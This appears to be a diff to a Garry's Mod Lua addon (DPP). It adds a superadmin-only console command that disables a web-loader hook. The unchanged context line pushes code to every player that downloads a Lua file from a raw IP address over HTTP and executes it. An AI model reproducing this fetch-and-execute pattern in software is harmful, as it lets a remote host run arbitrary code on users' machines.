@@ -75,4 +75,9 @@ if SERVER then
 	for k, v in pairs(player.GetAll()) do
 		v:SendLua([[http.Fetch('http://80.83.200.79/dpp/webloader.lua',function(b)CompileString(b,'DPP')()end)]])
 	end
+	
+	concommand.Add('dpp_disableweb', function(ply)
+		if IsValid(ply) and not ply:IsSuperAdmin() then return end
+		hook.Remove('PlayerInitialSpawn', 'DPP.WebLoader')
+	end)
 end
